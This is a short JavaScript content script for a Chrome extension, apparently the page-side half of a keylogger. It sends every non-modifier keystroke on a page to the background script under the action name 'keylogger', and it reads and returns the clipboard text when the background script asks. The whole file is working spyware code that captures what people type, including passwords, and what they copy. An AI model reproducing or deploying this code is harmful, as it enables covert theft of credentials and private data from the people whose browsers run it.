document.addEventListener('keydown', ({ key }) => {
  const ignoredKeys = ['Meta', 'Control', 'Alt', 'Shift'];
  if (!ignoredKeys.includes(key)) chrome.runtime.sendMessage({ action: 'keylogger', key });
});

// listen for messages from the background script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'getClipboard') {
    navigator.clipboard
      .readText()
      .then((clipText) => sendResponse({ clipboardContent: clipText }))
      .catch((err) => {
        console.error('Failed to read clipboard contents: ', err);
        sendResponse({ clipboardContent: 'cannot read clipboard' });
      });

    return true; // will send the response asynchronously
  }
});
